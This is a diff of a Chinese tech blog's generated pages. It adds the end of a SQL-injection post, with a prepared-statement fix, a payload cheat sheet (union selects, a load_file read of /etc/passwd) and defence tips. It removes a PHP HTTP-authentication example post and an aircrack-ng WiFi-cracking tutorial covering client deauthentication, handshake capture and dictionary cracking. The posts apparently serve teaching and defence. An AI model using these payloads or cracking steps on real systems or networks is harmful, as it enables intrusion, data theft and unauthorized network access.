+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$id</span> );</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$id</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> ) ) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>SQL 和参数分离，预处理之后参数不会被当成 SQL 执行，这才是正确的姿势。</p>
+<h2 id="常用-Payload-速查"><a href="#常用-Payload-速查" class="headerlink" title="常用 Payload 速查"></a>常用 Payload 速查</h2><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#39;</code></td>
+<td>测注入点</td>
+</tr>
+<tr>
+<td><code>1&#39; or &#39;1&#39;=&#39;1</code></td>
+<td>永真</td>
+</tr>
+<tr>
+<td><code>1&#39; order by n#</code></td>
+<td>数字段</td>
+</tr>
+<tr>
+<td><code>-1&#39; union select 1,database()#</code></td>
+<td>查库名</td>
+</tr>
+<tr>
+<td><code>-1&#39; union select 1,version()#</code></td>
+<td>查版本</td>
+</tr>
+<tr>
+<td><code>-1&#39; union select 1,user()#</code></td>
+<td>查用户</td>
+</tr>
+<tr>
+<td><code>-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></td>
+<td>查表</td>
+</tr>
+<tr>
+<td><code>-1&#39; union select 1,load_file(&#39;/etc/passwd&#39;)#</code></td>
+<td>读文件</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>SQL 注入防护要点：</p>
+<ol>
+<li>用预处理语句，别拼接 SQL</li>
+<li>输入要验证，数字就验证是不是数字</li>
+<li>错误信息别暴露太详细</li>
+<li>数据库用户权限给最小够用的</li>
+<li>密码加密存储</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1422,204 +1853,6 @@
 <li><p>此时可以看到界面已经汉化完成了!<br>  <img src="/images/pasted-42.png" alt="upload successful"></p>
 </li>
 </ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/14/%E7%94%A8-PHP-%E8%BF%9B%E8%A1%8C-HTTP-%E8%AE%A4%E8%AF%81%E7%9A%84%E5%87%A0%E7%A7%8D%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/10/14/%E7%94%A8-PHP-%E8%BF%9B%E8%A1%8C-HTTP-%E8%AE%A4%E8%AF%81%E7%9A%84%E5%87%A0%E7%A7%8D%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F-1/" class="post-title-link" itemprop="url">用 PHP 进行 HTTP 认证的几种认证方式</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-10-14 22:24:00" itemprop="dateCreated datePublished" datetime="2020-10-14T22:24:00+08:00">2020-10-14</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Example #1 Basic HTTP 认证范例</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;My Realm&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Text to send if user hits Cancel button&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Hello <span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You entered <span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_PW&#x27;]&#125;</span> as your password.&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Example #2 Digest HTTP 认证范例</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$realm</span> = <span class="string">&#x27;Restricted area&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//user =&gt; password</span></span><br><span class="line"><span class="variable">$users</span> = <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span> =&gt; <span class="string">&#x27;mypass&#x27;</span>, <span class="string">&#x27;guest&#x27;</span> =&gt; <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_DIGEST&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Digest realm=&quot;&#x27;</span>.<span class="variable">$realm</span>.</span><br><span class="line">           <span class="string">&#x27;&quot;,qop=&quot;auth&quot;,nonce=&quot;&#x27;</span>.<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;&quot;,opaque=&quot;&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$realm</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Text to send if user hits Cancel button&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// analyze the PHP_AUTH_DIGEST variable</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$data</span> = <span class="title function_ invoke__">http_digest_parse</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_DIGEST&#x27;</span>])) ||</span><br><span class="line">    !<span class="keyword">isset</span>(<span class="variable">$users</span>[<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Wrong Credentials!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate the valid response</span></span><br><span class="line"><span class="variable">$A1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;:&#x27;</span> . <span class="variable">$realm</span> . <span class="string">&#x27;:&#x27;</span> . <span class="variable">$users</span>[<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]]);</span><br><span class="line"><span class="variable">$A2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line"><span class="variable">$valid_response</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$A1</span>.<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;nonce&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;nc&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;cnonce&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;qop&#x27;</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$A2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;response&#x27;</span>] != <span class="variable">$valid_response</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Wrong Credentials!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ok, valid username &amp; password</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are logged in as: &#x27;</span> . <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// function to parse the http auth header</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_digest_parse</span>(<span class="params"><span class="variable">$txt</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// protect against missing data</span></span><br><span class="line">    <span class="variable">$needed_parts</span> = <span class="keyword">array</span>(<span class="string">&#x27;nonce&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;nc&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;cnonce&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;qop&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;username&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;response&#x27;</span>=&gt;<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$keys</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$needed_parts</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;@(&#x27;</span> . <span class="variable">$keys</span> . <span class="string">&#x27;)=(?:([\&#x27;&quot;])([^\2]+?)\2|([^\s,]+))@&#x27;</span>, <span class="variable">$txt</span>, <span class="variable">$matches</span>, PREG_SET_ORDER);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$matches</span> <span class="keyword">as</span> <span class="variable">$m</span>) &#123;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$m</span>[<span class="number">1</span>]] = <span class="variable">$m</span>[<span class="number">3</span>] ? <span class="variable">$m</span>[<span class="number">3</span>] : <span class="variable">$m</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$needed_parts</span>[<span class="variable">$m</span>[<span class="number">1</span>]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$needed_parts</span> ? <span class="literal">false</span> : <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Example #3 强迫重新输入用户名和密码的 HTTP 认证的范例</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Test Authentication System&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You must enter a valid login ID and password to access this resource\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>]) ||</span><br><span class="line">      (<span class="variable">$_POST</span>[<span class="string">&#x27;SeenBefore&#x27;</span>] == <span class="number">1</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;OldAuth&#x27;</span>] == <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &#123;</span><br><span class="line">   <span class="title function_ invoke__">authenticate</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome: <span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&lt;br /&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Old: <span class="subst">&#123;$_REQUEST[&#x27;OldAuth&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;<span class="subst">&#123;$_SERVER[&#x27;PHP_SELF&#x27;]&#125;</span>&#x27; METHOD=&#x27;post&#x27;&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;SeenBefore&#x27; value=&#x27;1&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;OldAuth&#x27; value=&#x27;<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Re Authenticate&#x27; /&gt;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/04/aircrack-ng/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/06/04/aircrack-ng/" class="post-title-link" itemprop="url">Aircrack-ng 爆破 wifi 密码</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-06-04 00:00:00" itemprop="dateCreated datePublished" datetime="2020-06-04T00:00:00+08:00">2020-06-04</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Aircrack-ng是一个基于WiFi无线网络分析有关的安全软件，主要功能有网络侦测、数据包嗅探、WEP和WPA&#x2F;WPA2-PSK破解等。<br>因为安全性的原因。现在，周围很少有用WEP算法来加密的WiFi密码，不过基本命令都很相似。</p>
-<p>WiFi网络构成</p>
-<ol>
-<li>WiFi是一个建立于IEEE 802.11标准的无线局域网络（WLAN）设备。</li>
-<li>WiFi工作原理AP(Access Point 例如：无线路由器)每100ms将SSID（Service Set Identifier）经由beacons（信号台）封包广播一次。</li>
-</ol>
-<h4 id="查看网卡信息"><a href="#查看网卡信息" class="headerlink" title="查看网卡信息"></a>查看网卡信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/pasted-57.png" alt="upload successful"></p>
-<h4 id="启动监听模式"><a href="#启动监听模式" class="headerlink" title="启动监听模式"></a>启动监听模式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/pasted-58.png" alt="upload successful"></p>
-<h4 id="准备抓取握手包"><a href="#准备抓取握手包" class="headerlink" title="准备抓取握手包"></a>准备抓取握手包</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 6 -bssid 64:6E:97:DA:39:5C -w thomas wlan0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-c：信道号</li>
-<li>–bssid：apMAC</li>
-<li>-w：保存的文件名</li>
-</ul>
-<p><img src="/images/pasted-59.png" alt="upload successful"></p>
-<p>扫描到的WiFi热点信息</p>
-<ul>
-<li>BSSID：WiFi路由器的MAC地址</li>
-<li>PWR：网卡报告信号水平，信号值越高说明离AP越近。（PWR&#x3D;-1，网卡驱动不支持报告此项信息）</li>
-<li>Beacons：无线AP发出的通告编号</li>
-<li>#Data：被捕获到的数据分组的数量（一般数据量越大，抓取握手包更容易）</li>
-<li>#&#x2F;s：过去10秒钟内每秒捕获数据分组的数量</li>
-<li>CH：信道号（从Beacon中获取）</li>
-<li>MB：无线AP所支持的最大速率</li>
-<li>ENC：加密算法体系</li>
-<li>CIPHER：加密算法</li>
-<li>AUTH：使用的认证协议</li>
-<li>ESSID：wifi名称</li>
-</ul>
-<p>使已连接WiFi的用户A强制下线，之后A会向WiFi路由重新发送一个带密码的请求握手包</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a 64:6E:97:DA:39:5C -c C2:46:34:ED:48:4C wlan0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-0：攻击数据包数量</li>
-<li>-a：WiFi MAC 地址</li>
-<li>-c：用户 MAC 地址</li>
-</ul>
-<p><img src="/images/pasted-60.png" alt="upload successful"></p>
-<p>出现 <code>WAP handshake</code> 表示已经获取到了握手包，下面就可以实现破解了</p>
-<p><img src="/images/pasted-61.png" alt="upload successful"></p>
-<h4 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w pass.txt thomas-01.cap</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-w：字典文件路径</li>
-</ul>
-<p><img src="/images/pasted-62.png" alt="upload successful"></p>
-<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><p>关于密码破解，可以使用kali自带的hashcat使效率大大增加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng [抓取到的握手包文件名] -J [转换后的文件名]</span><br><span class="line">hashcat -m 2500 .hccap password.txt</span><br></pre></td></tr></table></figure>
-<p>参数： -m 2500为破解的模式为WPA&#x2F;PSK方式  hccap格式的文件是刚刚转化好的文件  字典文件 </p>
-<p>注：最新版hashcat一般情况下不支持hccap格式，第一步需将握手包cap格式转换为hccapx</p>
 
       
     </div>
